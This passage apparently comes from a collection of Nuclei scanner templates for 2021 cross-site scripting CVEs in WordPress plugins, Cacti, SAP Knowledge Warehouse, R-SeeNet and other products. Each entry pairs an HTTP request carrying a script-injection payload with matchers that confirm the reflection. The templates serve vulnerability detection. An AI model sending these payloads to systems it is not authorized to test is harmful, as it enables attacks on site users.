    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
- condition - and

---
# SIS Informatik REWE GO SP17 \<7.7 - Cross-Site Scripting
## Description
- SIS Informatik REWE GO SP17 before 7.7 contains a cross-site scripting vulnerability via rewe/prod/web/index.php (affected parameters are config, version, win, db, pwd, and user) and /rewe/prod/web/rewe_go_check.php (version and all other parameters).
- severity - medium
- tags - cve,cve2021,xss,seclists
## Requests
- Method - GET
### URL
- {{BaseURL}}/rewe/prod/web/rewe_go_check.php?config=rewe&version=7.5.0%3cscript%3econfirm({{randstr}})%3c%2fscript%3e&win=2707
### Matchers

**Type - word**
- part - body
- words
    1. \<script>confirm({{randstr}})\</script>
    2. SIS-REWE
- condition - and

**Type - word**
- part - header
- words
    1. text/html

---
# WebCTRL OEM \<= 6.5 - Cross-Site Scripting
## Description
- WebCTRL OEM 6.5 and prior is susceptible to a cross-site scripting vulnerability because the login portal does not sanitize the operatorlocale GET parameter.
- severity - medium
- tags - cve,cve2021,webctrl,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.jsp?operatorlocale=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - body
- condition - and
- words
    1. ">\<script>alert(document.domain)\</script>
    2. common/lvl5

**Type - word**
- part - header
- words
    1. text/html

---
# Advantech R-SeeNet 2.4.12 - Cross-Site Scripting
## Description
- Advantech R-SeeNet 2.4.12 contains a reflected cross-site scripting vulnerability in the ssh_form.php script functionality.

- severity - medium
- tags - cve,cve2021,xss,r-seenet
## Requests
- Method - GET
### URL
- {{BaseURL}}/php/ssh_form.php?hostname=%3C/title%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Ctitle%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<title>SSH Session \</title>\<script>alert(document.domain)\</script>\<title>\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# SAP Knowledge Warehouse \<=7.5.0 - Cross-Site Scripting
## Description
- SAP Knowledge Warehouse 7.30, 7.31, 7.40, and 7.50 contain a reflected cross-site scripting vulnerability via the usage of one SAP KW component within a web browser.

- severity - medium
- tags - cve2021,sap,xss,seclists,packetstorm,cve
## Requests
- Method - GET
### URL
- {{BaseURL}}/SAPIrExtHelp/random/SAPIrExtHelp/random/%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp
### Matchers

**Type - word**
- part - body
- words
    1. \<SVG ONLOAD=&#97&#108&#101&#114&#116(&#X64&#X6F&#X63&#X75&#X6D&#X65&#X6E&#X74&#X2E&#X64&#X6F&#X6D&#X61&#X69&#X6E)>
    2. SAPIKS2
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Advantech R-SeeNet 2.4.12 - Cross-Site Scripting
## Description
- Advantech R-SeeNet 2.4.12 contains a reflected cross-site scripting vulnerability in the telnet_form.php script functionality.

- severity - medium
- tags - cve,cve2021,xss,r-seenet
## Requests
- Method - GET
### URL
- {{BaseURL}}/php/telnet_form.php?hostname=%3C%2Ftitle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Ctitle%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<title>Telnet \</title>\<script>alert(document.domain)\</script>\<title>\</title>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# JustWriting  -  Cross-Site Scripting
## Description
- A cross-site scripting vulnerability in application/controllers/dropbox.php in JustWriting 1.0.0 and below allow remote attackers to inject arbitrary web script or HTML via the challenge parameter.
- severity - medium
- tags - cve,cve2021,justwriting,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/sync/dropbox/download?challenge=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- words
    1. text/html
- part - header

---
# Moodle Jitsi Meet 2.7-2.8.3 - Cross-Site Scripting
## Description
- Moodle Jitsi Meet 2.7 through 2.8.3 plugin contains a cross-site scripting vulnerability via the "sessionpriv.php" module. This allows attackers to craft a malicious URL, which when clicked on by users, can inject JavaScript code to be run by the application.
- severity - medium
- tags - cve,cve2021,moodle,jitsi,xss,plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/mod/jitsi/sessionpriv.php?avatar=https%3A%2F%2F{{Hostname}}%2Fuser%2Fpix.php%2F498%2Ff1.jpg&nom=test_user%27)%3balert(document.domain)%3b//&ses=test_user&t=1
### Matchers

**Type - word**
- part - body
- words
    1. alert(document.domain);

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. MoodleSession

---
# Zyxel ZyWALL 2 Plus Internet Security Appliance - Cross-Site Scripting
## Description
- ZyXEL ZyWALL 2 Plus Internet Security Appliance contains a cross-site scripting vulnerability. Insecure URI handling leads to bypass of security restrictions, which allows an attacker to execute arbitrary JavaScript codes to perform multiple attacks.
- severity - medium
- tags - cve,cve2021,xss,zyxel,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/Forms/rpAuth_1?id=\</form>\<iMg%20src=x%20onerror="prompt(document.domain)">\<form>
### Matchers

**Type - word**
- part - body
- words
    1. \<iMg src=x onerror="prompt(document.domain)">\<form>
    2. Entry Error
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cacti - Cross-Site Scripting
## Description
- Cacti contains a cross-site scripting vulnerability via "http://\<CACTI_SERVER>/auth_changepassword.php?ref=\<script>alert(1)\</script>" which can successfully execute the JavaScript payload present in the "ref" URL parameter.
- severity - medium
- tags - cve,cve2021,cacti,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/auth_changepassword.php?ref=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. ">\</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Knowage Suite 7.3 - Cross-Site Scripting
## Description
- Knowage Suite 7.3 contains an unauthenticated reflected cross-site scripting vulnerability. An attacker can inject arbitrary web script in '/servlet/AdapterHTTP' via the 'targetService' parameter.
- severity - medium
- tags - cve,cve2021,xss,knowage
## Requests
- Method - GET
### URL
- {{BaseURL}}/knowage/servlet/AdapterHTTP?Page=LoginPage&NEW_SESSION=TRUE&TargetService=%2Fknowage%2Fservlet%2FAdapterHTTP%3FPage%3DLoginPage%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

---
# WordPress Under Construction \<1.19 - Cross-Site Scripting
## Description
- WordPress Under Construction plugin before 1.19 contains a cross-site scripting vulnerability. The plugin echoes out the raw value of `$GLOBALS['PHP_SELF']` in the ucOptions.php file on certain configurations, including Apache+modPHP.

- severity - medium
- tags - cve,cve2021,wp-plugin,wpscan,wordpress,wp,xss,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```
### Step - 2
```
GET /wp-admin/admin.php/"><script>alert(document.domain)</script>/?page=under-construction HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. action="/wp-admin/admin.php/">\<script>alert(document.domain)\</script>
    2. under-construction
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Cloudron 6.2 Cross-Site Scripting
## Description
- In Cloudron 6.2, the returnTo parameter on the login page is vulnerable to cross-site scripting.
- severity - medium
- tags - cve,cve2021,xss,cloudron,packetstorm
## Requests
- Method - GET
### URL
- {{BaseURL}}/login.html?returnTo=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

---
# WordPress Mediumish Theme \<=1.0.47 - Cross-Site Scripting
## Description
- WordPress Mediumish theme 1.0.47 and prior contains an unauthenticated reflected cross-site scripting vulnerability. The 's' GET parameter is not properly sanitized by the search feature before it is output back on the page.
- severity - medium
- tags - cve,cve2021,mediumish,xss,wordpress,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/?post_type=post&s=%22%3E%3Cscript%3Ealert(/{{randstr}}/)%3C/script%3E 
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. \<script>alert(/{{randstr}}/)\</script>
    2. Sorry, no posts matched your criteria.
- part - body
- condition - and

**Type - word**
- words
    1. text/html
- part - header

---
# WordPress Super Socializer \<7.13.30 - Cross-Site Scripting
## Description
- WordPress Super Socializer plugin before 7.13.30 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the urls parameter in its the_champ_sharing_count AJAX action (available to both unauthenticated and authenticated users) before outputting it back in the response.
- severity - medium
- tags - cve,cve2021,wpscan,xss,wp,wp-plugin,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=\<img%20src=x%20onerror=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. {"facebook_urls":[["\<img src=x onerror=alert(document.domain)>"]]

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# The Code Snippets WordPress Plugin \< 2.14.3 - Cross-Site Scripting
## Description
- The Wordpress plugin Code Snippets before 2.14.3 does not escape the snippets-safe-mode parameter before reflecting it in attributes, leading to a reflected cross-site scripting issue.
- severity - medium
- tags - authenticated,wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=snippets&snippets-safe-mode%5B0%5D=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. " style=animation-name:rotation onanimationstart=alert(document.domain) x
    2. Snippets
- condition - and

**Type - status**
- status
    1. 200

---
# NetBiblio WebOPAC - Cross-Site Scripting
## Description
- NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview via the searchTerm parameter.
- severity - medium
- tags - cve,cve2021,xss,netbiblio
## Requests
- Method - GET
### URL
- {{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x
- {{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F
### Matchers

**Type - word**
- part - body
- words
    1. SearchTerm: 'x'+alert(1)+'x',
    2. SearchTerm: 'x\\'+alert(1),//',
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. NetBiblio

**Type - status**
- status
    1. 200

---
# WordPress Domain Check \<1.0.17 - Cross-Site Scripting
## Description
- WordPress Domain Check plugin before 1.0.17 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the domain parameter before outputting it back in the page.
- severity - medium
- tags - wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=domain-check-profile&domain=test.foo<script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>
    2. Domain Check
- condition - and

**Type - status**
- status
    1. 200

---
# Erxes \<0.23.0 - Cross-Site Scripting
## Description
- Erxes before 0.23.0 contains a cross-site scripting vulnerability. The value of topicID parameter is not escaped and is triggered in the enclosing script tag.
- severity - medium
- tags - cve,cve2021,xss,erxes,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/widgets/knowledgebase?topicId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. topic_id: "\</script>\<script>alert(document.domain)\</script>
    2. window.erxesEnv
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress FeedWordPress \< 2022.0123 - Authenticated Cross-Site Scripting
## Description
- The plugin is affected by a cross-site scripting vulnerability within the "visibility" parameter.

- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<img src=1 onerror=alert(document.domain)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Apereo CAS Cross-Site Scripting
## Description
- Apereo CAS through 6.4.1 allows cross-site scripting via POST requests sent to the REST API endpoints.
- severity - medium
- tags - cve,cve2021,apereo,xss,cas
## Requests
### Step - 1
```
POST /cas/v1/tickets/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username=%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E&password=test

```
### Matchers

**Type - word**
- words
    1. \<img/src/onerror=alert(document.domain)>
    2. java.util.HashMap
- condition - and

**Type - status**
- status
    1. 401

---
# Vehicle Service Management System 1.0 - Stored Cross Site Scripting
## Description
- Vehicle Service Management System 1.0 contains a stored cross-site scripting vulnerability via the Service List section in login panel.

- severity - medium
- tags - cve,cve2021,xss,vms,authenticated
## Requests
### Step - 1
```
POST /classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{username}}&password={{password}}

```
### Step - 2
```
POST /classes/Master.php?f=save_service HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id=&service=%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&description=%3cp%3e%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e%3cbr%3e%3c%2fp%3e&status=1

```
### Step - 3
```
GET /admin/?page=maintenance/services HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, 'text/html')
    2. status_code_3 == 200
    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
- condition - and

---
# Seo Panel 4.8.0 - Cross-Site Scripting
## Description
- Seo Panel 4.8.0 contains a reflected cross-site scripting vulnerability via the seo/seopanel/login.php?sec=forgot email parameter.
- severity - medium
- tags - cve,cve2021,seopanel,xss
## Requests
### Step - 1
```
POST /seo/seopanel/login.php?sec=forgot HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

sec=requestpass&email=test%40test.com%22%3e%3cimg%20src%3da%20onerror%3dalert(document.domain)%3e11&code=AAAAA&login=

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. \<img src=a onerror=alert(document.domain)>
    2. seopanel
- condition - and

---
# WordPress Sassy Social Share Plugin \<3.3.40 - Cross-Site Scripting
## Description
- WordPress plugin Sassy Social Share \< 3.3.40 contains a reflected cross-site scripting vulnerability.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,wp,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-json/wp/v2/posts
- {{BaseURL}}/{{slug}}/?a&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;
### Matchers

**Type - word**
- part - body
- words
    1. ?a">\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200
### Extractors

**Type - regex**
- part - body
- name - slug
- internal - True
- group - 1
- regex
    1. "slug":"([_a-z-A-Z0-9]+)",

---
# Tiny Java Web Server - Cross-Site Scripting
## Description
- A reflected cross-site scripting vulnerability in the web server TTiny Java Web Server and Servlet Container (TJWS) \<=1.115 allows an adversary to inject malicious code on the server's "404 Page not Found" error page.
- severity - medium
- tags - cve,cve2021,xss,tjws,java,seclists
## Requests
- Method - GET
### URL
- {{BaseURL}}/te%3Cimg%20src=x%20onerror=alert(42)%3Est
### Matchers

**Type - status**
- status
    1. 404

**Type - word**
- part - body
- words
    1. \<H2>404 te\<img src=x onerror=alert(42)>st not found\</H2>

**Type - word**
- part - header
- words
    1. text/html

---
# Thruk 2.40-2 - Cross-Site Scripting
## Description
- Thruk 2.40-2 contains a cross-site scripting vulnerability via /thruk/#cgi-bin/status.cgi?style=combined&title={TITLE] in the host or title parameter. An attacker can inject arbitrary JavaScript into status.cgi, leading to a triggered payload when accessed by an authenticated user.

- severity - medium
- tags - cve,cve2021,thruk,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/thruk/cgi-bin/login.cgi?thruk/cgi-bin/status.cgi%3fstyle=combined&title=%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. '>\</script>\<script>alert(document.domain)\</script>
    2. Thruk Monitoring
- condition - and

**Type - status**
- status
    1. 401

---
# WordPress FoodBakery \<2.2 - Cross-Site Scripting
## Description
- WordPress FoodBakery before 2.2 contains an unauthenticated reflected cross-site scripting vulnerability. It does not properly sanitize the foodbakery_radius parameter before outputting it back in the response.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/listings/?search_title=&location=&foodbakery_locations_position=filter&search_type=autocomplete&foodbakery_radius=10%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Vehicle Service Management System 1.0 - Stored Cross Site Scripting
## Description
- Vehicle Service Management System 1.0 contains a stored cross-site scripting vulnerability via the Mechanic List section in login panel.

- severity - medium
- tags - cve,cve2021,xss,vms,authenticated
## Requests
### Step - 1
```
POST /classes/Login.php?f=login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{username}}&password={{password}}

```
### Step - 2
```
POST /classes/Master.php?f=save_mechanic HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

id=&name=%22%3e%3cscript%3ealert%28document.domain%29%3c%2fscript%3e&contact=asd1&email=asd1@asd.com&status=1

```
### Step - 3
```
GET /admin/?page=mechanics HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - dsl**
- dsl
    1. contains(all_headers_3, 'text/html')
    2. status_code_3 == 200
    3. contains(body_3, "\<td>\">\<script>alert(document.domain)\</script>\</td>")
- condition - and

---
# EPrints 3.4.2 - Cross-Site Scripting
## Description
- EPrints 3.4.2 contains a reflected cross-site scripting vulnerability via the cgi/cal URI.
- severity - medium
- tags - cve,cve2021,xss,eprints
## Requests
- Method - GET
### URL
- {{BaseURL}}/cgi/cal?year=2021%3C/title%3E%3Cscript%3Ealert(%27{{randstr}}%27)%3C/script%3E
### Matchers

**Type - word**
- words
    1. \</title>\<script>alert('{{randstr}}')\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Calendar Event Multi View \<1.4.01 - Cross-Site Scripting
## Description
- WordPress Calendar Event Multi View plugin before 1.4.01 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize or escape the 'start' and 'end' GET parameters before outputting them in the page (via php/edit.php).
- severity - medium
- tags - cve,cve2021,xss,wordpress,wp-plugin,wpscan
## Requests
### Step - 1
```
GET /?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22 HTTP/1.1
Host: {{Hostname}}
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

```
### Matchers

**Type - word**
- words
    1. >\<svg/onload=alert(1)>\<
    2. Calendar Details
- part - body
- condition - and

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# Advantech R-SeeNet - Cross-Site Scripting
## Description
- Advantech R-SeeNet contains a cross-site scripting vulnerability in the device_graph_page.php script via the graph parameter. A specially crafted URL by an attacker can lead to arbitrary JavaScript code execution.
- severity - medium
- tags - cve,cve2021,rseenet,xss,graph
## Requests
- Method - GET
### URL
- {{BaseURL}}/php/device_graph_page.php?graph=%22zlo%20onerror=alert(1)%20%22
### Matchers

**Type - word**
- words
    1. "zlo onerror=alert(1) "
    2. Device Status Graph
- part - body
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress JH 404 Logger \<=1.1 - Cross-Site Scripting
## Description
- WordPress JH 404 Logger plugin through 1.1 contains a cross-site scripting vulnerability. Referer and path of 404 pages are not properly sanitized when they are output in the WordPress dashboard, which can lead to executing arbitrary JavaScript code.
- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,xss,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/jh-404-logger/readme.txt
### Matchers

**Type - word**
- words
    1. JH 404 Logger
- part - body

**Type - status**
- status
    1. 200

---
# EPrints 3.4.2 - Cross-Site Scripting
## Description
- EPrints 3.4.2 contains a reflected cross-site scripting vulnerability in the dataset parameter to the cgi/dataset_ dictionary URI.
- severity - medium
- tags - cve,cve2021,xss,eprints
## Requests
- Method - GET
### URL
- {{BaseURL}}/cgi/dataset_dictionary?dataset=zulu%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WOOF WordPress plugin - Cross-Site Scripting
## Description
- The WOOF WordPress plugin does not sanitize or escape the woof_redraw_elements parameter before reflecting it back in an admin page, leading to a reflected cross-site scripting.

- severity - medium
- tags - cve,cve2021,wordpress,wp-plugin,wp,xss,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=woof_draw_products&woof_redraw_elements[]=\<img%20src=x%20onerror=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. "additional_fields":["\<img src=x onerror=alert(document.domain)>"]}

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Atmail 6.5.0 - Cross-Site Scripting
## Description
- Atmail 6.5.0 contains a cross-site scripting vulnerability in WebAdmin Control Pane via the format parameter to the default URI, which allows remote attackers to inject arbitrary web script or HTML via the “format” parameter.

- severity - medium
- tags - cve,cve2021,atmail,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/atmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
- {{BaseURL}}/atmail/webmail/?format=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \<script>alert(document.domain)\</script>" does not exist

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 500
    2. 403
- condition - or

---
# BeyondTrust Secure Remote Access Base \<=6.0.1 - Cross-Site Scripting
## Description
- BeyondTrust Secure Remote Access Base through 6.0.1 contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML.
- severity - medium
- tags - xss,packetstorm,cve,cve2021,beyondtrust,bomgar
## Requests
- Method - GET
### URL
- {{BaseURL}}/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password
### Matchers

**Type - word**
- case-insensitive - True
- part - body
- words
    1. \<svg/onload=alert(document.domain)>
    2. bomgar
- condition - and

**Type - status**
- status
    1. 200

---
# WordPress Simple Giveaways \<2.36.2 - Cross-Site Scripting
## Description
- WordPress Simple Giveaways plugin before 2.36.2 contains a cross-site scripting vulnerability via the method and share GET parameters of the Giveaway pages, which are not sanitized, validated, or escaped before being output back in the pages.

- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/giveaway/mygiveaways/?share=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# AppCMS - Cross-Site Scripting
## Description
- AppCMS 2.0.101 has a cross-site scripting vulnerability in \templates\m\inc_head.php.
- severity - medium
- tags - cve,cve2021,appcms,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/templates/m/inc_head.php?q=%22%3e%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. "">\</script>\<script>alert(document.domain)\</script>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sidekiq \<=6.2.0 - Cross-Site Scripting
## Description
- Sidekiq through 5.1.3 and 6.x through 6.2.0 contains a cross-site scripting vulnerability via the queue name of the live-poll feature when Internet Explorer is used.
- severity - medium
- tags - cve,cve2021,xss,sidekiq
## Requests
- Method - GET
### URL
- {{BaseURL}}/sidekiq/queues/"onmouseover="alert(nuclei)"
### Matchers

**Type - word**
- part - body
- words
    1. onmouseover="alert('nuclei')

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Stop Spammers \<2021.9 - Cross-Site Scripting
## Description
- WordPress Stop Spammers plugin before 2021.9 contains a reflected cross-site scripting vulnerability. It does not escape user input when blocking requests (such as matching a spam word), thus outputting it in an attribute after sanitizing it to remove HTML tags.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,packetstorm
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP+Cookie+check;

log=ad%22+accesskey%3DX+onclick%3Dalert%281%29+%22&pwd=&wp-submit=%D9%88%D8%B1%D9%88%D8%AF&redirect_to=http://localhost/wp-admin&testcookie=1

```
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - header
- words
    1. text/html

**Type - word**
- part - body
- words
    1. ad" accesskey=X onclick=alert(1)

---
# WordPress WHMCS Bridge \<6.4b - Cross-Site Scripting
## Description
- WordPress WHMCS Bridge plugin before 6.4b contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the error parameter before outputting it back in the admin dashboard.

- severity - medium
- tags - whmcs,xss,wpscan,wordpress,wp-plugin,wp,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \<strong>\<img src onerror=alert(document.domain)>\</strong>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Hotel Druid 3.0.2 - Cross-Site Scripting
## Description
- Hotel Druid 3.0.2 contains a cross-site scripting vulnerability in multiple pages which allows for arbitrary execution of JavaScript commands.
- severity - medium
- tags - cve,cve2021,hoteldruid,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/visualizza_tabelle.php?anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1
- {{BaseURL}}/storia_soldi.php?piu17%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ee3esq=1
